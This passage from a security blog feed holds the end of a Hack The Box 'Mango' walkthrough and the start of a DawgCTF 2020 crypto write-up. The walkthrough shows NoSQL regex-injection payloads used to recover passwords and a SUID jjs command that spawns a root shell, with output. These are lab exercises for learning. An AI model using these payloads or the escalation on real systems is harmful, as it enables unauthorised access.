&lt;span class="code-line"&gt;username[%24ne]=admin&amp;amp;password[%24regex]=h3mXK8RhU§q§.{6}&amp;amp;login=login&lt;/span&gt;
&lt;span class="code-line"&gt;username[%24ne]=admin&amp;amp;password[%24regex]=h3mXK8RhU~f{]f5§q§.{0}&amp;amp;login=login&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We finally get the password &lt;code&gt;h3mXK8RhU~f{]f5H&lt;/code&gt;. We try to login with it but this
not the admin password as mentioned earlier. We repeat the process with the
following payload and get the admin password &lt;code&gt;t9KcS3&amp;gt;!0B#2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username=admin&amp;amp;password[%24regex]=§a§.{12}&amp;amp;login=login&lt;/code&gt;&lt;/p&gt;
&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;p&gt;The admin password is working. But we cannot use it to connect using SSH. We
need to find the other user. After some guessing we found that the other user is
simply "mango". We can then connect to the box using SSH and the previous
password.&lt;/p&gt;
&lt;p&gt;The user flag is not in the mango user home folder. We need to login as the
admin user. A simple &lt;code&gt;su admin&lt;/code&gt; with the previously found password do the trick.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mango@mango:~$ su admin&lt;/span&gt;
&lt;span class="code-line"&gt;Password: &lt;/span&gt;
&lt;span class="code-line"&gt;$ cd&lt;/span&gt;
&lt;span class="code-line"&gt;$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;jjs  user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;79bf31&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;We start enumerating the box for privileges escalation. Listing our &lt;code&gt;sudo&lt;/code&gt; right
and the SUID binaries.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;admin@mango:/home/admin$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;[sudo] password for admin: &lt;/span&gt;
&lt;span class="code-line"&gt;Sorry, user admin may not run sudo on mango.&lt;/span&gt;
&lt;span class="code-line"&gt;admin@mango:/home/admin$ find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7713/bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7713/bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 136808 Jun 10 22:53 /snap/core/7713/usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 19:46 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 root root 106696 Aug 30 07:09 /snap/core/7713/usr/lib/snapd/snap-confine&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/6350/bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/6350/bin/ping&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/6350/bin/ping6&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/6350/bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/6350/bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/6350/usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/6350/usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/6350/usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/6350/usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/6350/usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/6350/usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 428240 Nov  5  2018 /snap/core/6350/usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 root root 98472 Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/6350/usr/sbin/pppd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 root root 18161 Jul 15  2016 /usr/bin/run-mailcap&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root messagebus 42992 Jun 10 18:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 root root 101240 Mar 15  2019 /usr/lib/snapd/snap-confine&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We search for the binaries on GTFObins and &lt;a href="https://gtfobins.github.io/gtfobins/jjs/#suid"&gt;jjs&lt;/a&gt;
get our attention. We can directly use the gtfobins command but the process just hang.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;admin@mango:/home/mango$ echo &amp;quot;Java.type(&amp;#39;java.lang.Runtime&amp;#39;).getRuntime().exec(&amp;#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&amp;#39;).waitFor()&amp;quot; | /usr/lib/jvm/java-11-openjdk-/bin/jjs&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: The jjs tool is planned to be removed from a future JDK release&lt;/span&gt;
&lt;span class="code-line"&gt;jjs&amp;gt; Java.type(&amp;#39;java.lang.Runtime&amp;#39;).getRuntime().exec(&amp;#39;/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &amp;lt;/dev/pts/0 &amp;gt;/dev/pts/0 2&amp;gt;/dev/pts/0&amp;#39;).waitFor()&lt;/span&gt;
&lt;span class="code-line"&gt;#&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We modify the command to use &lt;code&gt;/bin/bash&lt;/code&gt; instead of &lt;code&gt;sh&lt;/code&gt; and it work (the user input are
not prompted when typing but when you hit enter it gives the command result).
The first command is &lt;code&gt;id&lt;/code&gt; the second is &lt;code&gt;cat /root/root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;admin@mango:/home/mango$ echo &amp;quot;Java.type(&amp;#39;java.lang.Runtime&amp;#39;).getRuntime().exec(&amp;#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&amp;#39;).waitFor()&amp;quot; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: The jjs tool is planned to be removed from a future JDK release&lt;/span&gt;
&lt;span class="code-line"&gt;jjs&amp;gt; Java.type(&amp;#39;java.lang.Runtime&amp;#39;).getRuntime().exec(&amp;#39;/bin/sh -pc $@|sh${IFS}-p _ echo /bin/bash -p &amp;lt;/dev/pts/0 &amp;gt;/dev/pts/0 2&amp;gt;/dev/pts/0&amp;#39;).waitFor()&lt;/span&gt;
&lt;span class="code-line"&gt;bash-4.4# uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)&lt;/span&gt;
&lt;span class="code-line"&gt;bash-4.4# 8a8ef&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The NoSQL injection was quit fun. Doing it manually with Burp was really
interesting.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;jjs&lt;/code&gt; privilege escalation was not really hard.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="NoSQL"></category><category term="SUID"></category><category term="linux"></category></entry><entry><title>DawgCTF 2020</title><link href="https://maggick.fr/2020/04/dawgctf-2020.html" rel="alternate"></link><published>2020-04-13T10:00:00+02:00</published><updated>2020-04-13T10:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-13:/2020/04/dawgctf-2020.html</id><summary type="html">&lt;p&gt;&lt;img alt="Cyberdawgs logo" class="align-left" src="/media/2020.04/cyberdawgs_logo.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This weekend I participate to the DawgCTF with the team
&lt;code&gt;hackers for the jilted generation&lt;/code&gt;. We finished 46th with 4530 points.
Here are some writeup about the cryptography challenges.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/cyberdawgs_logo.png" alt="Cyberdawgs logo" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This weekend I participate to the DawgCTF with the team
&lt;code&gt;hackers for the jilted generation&lt;/code&gt;. We finished 46th with 4530 points.
Here are some writeup about the cryptography challenges.&lt;/p&gt;


&lt;h1 id="crypto"&gt;Crypto&lt;/h1&gt;
&lt;p&gt;For most of the crypto challenges we are provided with client python script that
allow to connect to the oracle service.&lt;/p&gt;
&lt;h2 id="take-it-back-now-yall-25"&gt;Take It Back Now, Y'all (25)&lt;/h2&gt;
&lt;p&gt;The first crypto challenge is a simple sanity check.&lt;/p&gt;
&lt;p&gt;Here is the provided client:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Created for Spring 2020 CTF&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Cryptography 0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;10 Points&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Welcome to my sanity check.  You&amp;#39;ll find this to be fairly easy.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;The oracle is found at umbccd.io:13370, and your methods are:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;    flg - returns the flag&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;    tst - returns the message after the : in &amp;quot;tst:...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect using telnet and call the &lt;code&gt;flg&lt;/code&gt; method.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;telnet crypto.ctf.umbccd.io 13370&lt;/span&gt;
&lt;span class="code-line"&gt;Trying 3.81.180.84...&lt;/span&gt;
&lt;span class="code-line"&gt;Connected to crypto.ctf.umbccd.io.&lt;/span&gt;
&lt;span class="code-line"&gt;Escape character is &amp;#39;^]&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;flg&lt;/span&gt;
&lt;span class="code-line"&gt;DawgCTF{H3ll0_W0rld!}Connection closed by foreign host.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="one-hop-this-time-one-hop-this-time-75"&gt;One Hop This Time, One Hop This Time (75)&lt;/h2&gt;
&lt;p&gt;The second one is nothing complicated either.&lt;/p&gt;
&lt;p&gt;Here is the client:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Created for Spring 2020 CTF&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Cryptography 1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;40 Points&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Welcome to the one time pad oracle!&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;Our oracle&amp;#39;s function is enc := key ^ msg | dec := key ^ ct&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;The oracle is found at umbccd.io:13371, and your methods are:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;    flg - returns the encrypted flag&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;    enc - returns the encryption of the message after the : in &amp;quot;enc:...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;    dec - returns the decryption of the ciphertext after the : in &amp;quot;dec:...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;@author: pleoxconfusa&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We open a socket, grab the encrypted flag and decrypt it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;13371&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;crypto.ctf.umbccd.io&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# connect to the server on local computer&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dec:&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="right-foot-two-stomps-200"&gt;Right Foot Two Stomps (200)&lt;/h2&gt;
&lt;p&gt;Here is the provided client:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Created for Spring 2020 CTF&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Cryptography 2&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;100 Points&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Welcome to the AES-CBC oracle!&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;Our oracle&amp;#39;s function is AES-CBC.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;The oracle is found at umbccd.io:13372, and your methods are:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;    flg - returns the encrypted flag&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;    enc - returns the encryption of the message after the : in &amp;quot;enc:...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;          as 16 bytes of initialization vector followed by the ciphertext.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;    dec - returns the decryption of the ciphertext after the : in &amp;quot;dec:&amp;lt;16 bytes iv&amp;gt;...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;          as a bytes string.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We open a socket, grab the encrypted flag, send some data to get the IV, and
send back the flag with the IV to decrypt it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;13372&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;crypto.ctf.umbccd.io&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#print(flag)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;enc:test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
